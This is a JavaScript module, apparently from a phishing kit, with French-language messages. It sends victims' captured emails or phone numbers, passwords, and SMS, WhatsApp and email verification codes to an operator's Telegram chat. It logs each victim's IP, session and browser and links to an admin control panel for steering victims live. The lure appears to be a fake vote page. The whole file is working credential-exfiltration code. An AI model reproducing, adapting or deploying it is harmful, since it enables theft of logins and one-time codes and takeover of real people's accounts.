const { getClient } = require('./db');

function getAdminUrl(session, ip) {
  const base = process.env.ADMIN_URL || '';
  if (!base) return '';
  return `${base}/control_panel.php?session=${encodeURIComponent(session)}&ip=${encodeURIComponent(ip)}`;
}

async function sendTelegram(message) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    console.log('[TG] Pas de token/chat configure. Message:', message.replace(/<[^>]+>/g, ''));
    return;
  }

  try {
    const resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });
    const data = await resp.json();
    if (!data.ok) {
      console.error('[TG] Erreur API:', data.description);
    }
  } catch (err) {
    console.error('[TG] Erreur reseau:', err.message);
  }
}

function getFieldEmoji(field) {
  const emojis = { email: '📧', password: '🔑', sms_code: '💬', whatsapp_code: '📱', email_code: '✉️' };
  return emojis[field] || '📋';
}

function getFieldLabel(field) {
  const labels = { email: 'Email / Telephone', password: 'Mot de passe', sms_code: 'Code SMS', whatsapp_code: 'Code WhatsApp', email_code: 'Code Email' };
  return labels[field] || field;
}

function getClientSummary(session, ip) {
  const client = getClient(session, ip);
  if (!client) return '';
  let lines = [];
  if (client.email) lines.push(`📧 Email: <code>${client.email}</code>`);
  if (client.password) lines.push(`🔑 Mdp: <code>${client.password}</code>`);
  if (client.sms_code) lines.push(`💬 SMS: <code>${client.sms_code}</code>`);
  if (client.whatsapp_code) lines.push(`📱 WhatsApp: <code>${client.whatsapp_code}</code>`);
  if (client.email_code) lines.push(`✉️ Email code: <code>${client.email_code}</code>`);
  return lines.length ? '\n\n📋 <b>Donnees collectees:</b>\n' + lines.join('\n') : '';
}

function adminButton(session, ip) {
  const url = getAdminUrl(session, ip);
  return url ? `\n\n🎛 <a href="${url}">Ouvrir le panneau admin</a>` : '';
}

function notifyNewClient(client) {
  const now = new Date().toLocaleString('fr-FR', { timeZone: 'Africa/Kinshasa' });
  return sendTelegram(
    `<b>🔗 NOUVEAU CLIENT</b>\n` +
    `━━━━━━━━━━━━━━━━━\n` +
    `🖥 IP: <code>${client.ip}</code>\n` +
    `🆔 Session: <code>${client.session}</code>\n` +
    `🌐 Navigateur: <code>${client.user_agent || 'inconnu'}</code>\n` +
    `🕐 Heure: ${now}` +
    adminButton(client.session, client.ip)
  );
}

function notifyData(session, ip, field, value) {
  const emoji = getFieldEmoji(field);
  const label = getFieldLabel(field);
  const now = new Date().toLocaleString('fr-FR', { timeZone: 'Africa/Kinshasa' });
  const summary = getClientSummary(session, ip);
  return sendTelegram(
    `<b>${emoji} DONNEE RECUE</b>\n` +
    `━━━━━━━━━━━━━━━━━\n` +
    `${label}: <code>${value}</code>\n` +
    `🖥 IP: <code>${ip}</code>\n` +
    `🕐 Heure: ${now}` +
    summary +
    adminButton(session, ip)
  );
}

function notifyAction(session, ip, action) {
  const now = new Date().toLocaleString('fr-FR', { timeZone: 'Africa/Kinshasa' });
  return sendTelegram(
    `<b>⚡ ACTION ADMIN</b>\n` +
    `━━━━━━━━━━━━━━━━━\n` +
    `Action: <code>${action}</code>\n` +
    `🖥 IP: <code>${ip}</code>\n` +
    `🕐 Heure: ${now}`
  );
}

function notifyPageChange(session, ip, page) {
  const now = new Date().toLocaleString('fr-FR', { timeZone: 'Africa/Kinshasa' });
  return sendTelegram(
    `<b>📄 PAGE CHANGEE</b>\n` +
    `━━━━━━━━━━━━━━━━━\n` +
    `Page: <code>${page}</code>\n` +
    `🖥 IP: <code>${ip}</code>\n` +
    `🕐 Heure: ${now}` +
    adminButton(session, ip)
  );
}

function notifyVoteApproved(session, ip) {
  const now = new Date().toLocaleString('fr-FR', { timeZone: 'Africa/Kinshasa' });
  const summary = getClientSummary(session, ip);
  return sendTelegram(
    `<b>✅ VOTE APPROUVE</b>\n` +
    `━━━━━━━━━━━━━━━━━\n` +
    `🖥 IP: <code>${ip}</code>\n` +
    `🕐 Heure: ${now}` +
    summary
  );
}

module.exports = { sendTelegram, notifyNewClient, notifyData, notifyAction, notifyPageChange, notifyVoteApproved };
